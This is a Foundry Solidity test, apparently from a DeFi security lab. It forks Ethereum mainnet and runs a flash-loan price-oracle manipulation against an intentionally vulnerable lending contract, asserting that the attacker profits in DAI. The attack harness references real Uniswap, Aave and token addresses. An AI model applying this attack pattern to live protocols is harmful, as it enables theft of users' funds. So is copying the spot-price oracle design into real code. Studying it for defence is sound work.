// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/v8/VulnerableLending.sol";
import "../../src/v8/OracleAttacker.sol";
import "../../src/interfaces/IERC20.sol";

contract OracleManipulation is Test {
    VulnerableLending public lending;
    OracleAttacker public attacker;

    // Mainnet addresses (for forking)
    address constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant WETH_DAI_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address constant AAVE_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    address public attackerEOA = makeAddr("attacker");

    function setUp() public {
        // Fork mainnet at a specific block for reproducibility
        console.log("\n=== SETUP (Mainnet Fork) ===");
        vm.createSelectFork(vm.envString("INFURA_URL"), 23_000_000);

        // Check pair reserves
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(WETH_DAI_PAIR).getReserves();
        console.log("DAI reserves:", uint256(reserve0) / 1e18);
        console.log("WETH reserves:", uint256(reserve1) / 1e18);

        // Deploy lending protocol
        lending = new VulnerableLending(WETH_DAI_PAIR, WETH, DAI);
        console.log("VulnerableLending deployed");

        // Fund lending with DAI (for borrowing)
        deal(DAI, address(lending), 1_000_000 ether); // 1M DAI
        console.log("Fund with:", IERC20(DAI).balanceOf(address(lending)) / 1e18, "DAI");

        // Check initial price
        uint256 initialPrice = lending.getETHPrice();
        console.log("Initial ETH price:", initialPrice / 1e18, "DAI per ETH");

        // Deploy attacker contract
        vm.prank(attackerEOA);
        attacker =
            new OracleAttacker(payable(address(lending)), UNISWAP_ROUTER, AAVE_POOL, WETH, DAI);
        console.log("OracleAttacker deployed");

        // Fund attacker contract with ETH for collateral
        vm.deal(address(attacker), 20 ether);
        console.log("Fund with:", address(attacker).balance / 1e18, "ETH");
    }

    function testOracleManipulationAttack() public {
        console.log("\n=== FLASH LOAN ORACLE MANIPULATION ===\n");
        console.log("Attacker uses Aave flash loan for massive manipulation");
        console.log("This is how real attacks work in production\n");

        // Record initial state
        uint256 priceInitial = lending.getETHPrice();
        uint256 attackerDAIBefore = IERC20(DAI).balanceOf(address(attacker));

        console.log("[STEP 0] Initial state");
        console.log("  Price reported by Oracle:", priceInitial / 1e18, "WETH/DAI");
        console.log("  Attacker DAI balance:", attackerDAIBefore / 1e18, "DAI\n");

        // Attacker requests flash loan and performs the attack
        uint256 flashLoanAmount = 500_000 ether; // Borrow 500,000 WETH
        uint256 collateralToDeposit = 10 ether; // Deposit 10 ETH as collateral
        console.log("[STEP 1] Flash loan");
        console.log("  Requested amount:", flashLoanAmount / 1e18, "WETH");
        console.log("  Deposited collateral:", collateralToDeposit / 1e18, "ETH\n");
        attacker.flash_loan(flashLoanAmount, collateralToDeposit);

        // Record final state
        uint256 attackerDAIAfter = IERC20(DAI).balanceOf(address(attacker));
        uint256 daiProfit = attackerDAIAfter - attackerDAIBefore;
        uint256 priceFinal = lending.getETHPrice();

        // Assertions
        assertGt(daiProfit, 0, "Attack should be profitable");
        assertApproxEqRel(priceFinal, priceInitial, 0.02e18, "Price should be mostly restored");

        console.log("[STEP 7] Results");
        console.log("  Final ETH price:", priceFinal / 1e18, "DAI per ETH");
        console.log("  Attacker borrowed", flashLoanAmount / 1e18, "WETH for free (flash loan)");
        console.log("  Used it to manipulate price and steal", daiProfit / 1e18, "DAI\n");
    }
}
